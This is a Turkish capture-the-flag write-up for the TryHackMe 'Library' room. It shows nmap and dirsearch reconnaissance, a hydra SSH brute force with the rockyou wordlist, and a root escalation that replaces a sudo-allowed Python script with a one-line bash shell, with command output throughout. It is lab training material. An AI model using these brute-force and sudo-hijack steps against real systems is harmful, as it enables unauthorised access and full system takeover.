# TryHackMe - Library

Merhabalar, bu yazımda sizlere tryhackme.com platformunda bulunan library isimli odanın çözümünü göstereceğim. Bu makinede bulmamız gereken iki adet bayrak var. İlk önce nmap aracını kullanarak makinede açık olan portları görüntüleyeceğim.

```markdown
> nmap -sVC -n 10.10.104.11 --min-rate 1000

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 09:40 EDT
Nmap scan report for 10.10.104.11
Host is up (0.068s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
> 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
> 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to  Blog - Library Machine
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.85 seconds
```

Gördüğünüz üzere varsayılan 2 port açık bulunmakta. Web sitesinin ana sayfasında `meliodas` isimli bir kullanıcının gönderisini görüyoruz. Hemen alt kısmında ise yorumları ve yorum gönderebilmek için kullanılan bir form görüyoruz.

![1](https://github.com/ronark7/writeups/assets/165813191/b987b3f4-c42b-4f91-b51a-03041dd63963)

formdan gönderilen veriden herhangi bir dönüt alamıyorum, muhtemelen sadece süs olarak konduğundandır. Dirsearch ile bir dosya/dizin taraması gerçekleştirdim, sonucunda ise robots.txt dosyasını ve /images adında bir dizin olduğunu öğrendim.

```markdown
> dirsearch -u http://10.10.104.11/

...
[09:53:08] 301 -  313B  - /images  ->  http://10.10.104.11/images/
[09:53:08] 200 -  510B  - /images/
[09:53:36] 200 -   33B  - /robots.txt
...
```

/images dizini içerisinde 4 adet resim bulunuyor. robots.txt dosyasının içerisinde ise "User-agent: rockyou" şeklinde bir mesaj var. Bu mesaj bize brute force yapmamız gerektiğini söylüyor olabilir. Sonuçta rockyou, daha önceden verileri sızdırılan bir web sitesi. Günümüzde bu verileri kullanarak deneme yanılma saldırıları yapıyoruz çünkü içerisinde onlarca farklı kombinasyonda şifre bulunuyor.

```markdown
> hydra -l meliodas -P Desktop/rockyou.txt ssh://10.10.104.11 -t 60

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-02 10:04:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 60 tasks per 1 server, overall 60 tasks, 14344399 login tries (l:1/p:14344399), ~239074 tries per task
[DATA] attacking ssh://10.10.104.11:22/
> [22][ssh] host: 10.10.104.11   login: meliodas   password: *********
...
```

mesajdan yola çıkarak hydra ile brute force yaptıktan sonra `meliodas` kullanıcısının şifresine erişmiş oluyoruz. SSH üzerinden bağlandıktan sonra bulunduğumuz dizinde ilk bayrağımızı yani user.txt dosyasını alıyoruz.

```
The authenticity of host '10.10.104.11 (10.10.104.11)' can't be established.
ED25519 key fingerprint is SHA256:Ykgtf0Q1wQcyrBaGkW4BEBf3eK/QPGXnmEMgpaLxmzs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.104.11' (ED25519) to the list of known hosts.
meliodas@10.10.104.11's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
meliodas@ubuntu:~$ ls
bak.py  user.txt
meliodas@ubuntu:~$ cat user.txt 
{bayrak}
meliodas@ubuntu:~$ 
meliodas@ubuntu:~$ 
```

Gördüğünüz üzere bulunduğumuz dizinde user.txt dışında bak.py adında bir dosya daha var. Bu dosyanın içeriği aşağıda ki şekildedir.

```
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

`sudo -l` komutunu kullandığımızda ise bu dosyayı herhangi bir versiyonda python ile herhangi bir kullanıcı olarak çalıştırabileceğimizi görüyoruz.

```
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

Dosyanın içerisine bir shell kodu koyarak root yetkisine erişebileceğini düşünebilirsiniz ancak bu dosyayı düzenleme yetkimiz bulunmamakta. Bunun yerine dosyayı silme yetkimiz olduğundan silip aynı isimde, yetki yükseltebileceğimiz bir dosya yapabiliriz. Öncelikle `rm bak.py` komutunu kullanarak dosyayı silelim daha sonra ise vi ile bak.py dosyasını oluşturup içerisine aşağıda ki kodu girelim.

```
import os;os.system('/bin/bash')
```

Bu kod, os kütüphanesini kullanarak bash shelle geçmemizi sağlayacak. çalıştırmadan önce de başına sudo koyduğumuzda ise root yetkisini almış olacağız.

```
meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# cd /root
root@ubuntu:/root# ls
root.txt
root@ubuntu:/root# cat root.txt 
{bayrak}
root@ubuntu:/root#
```
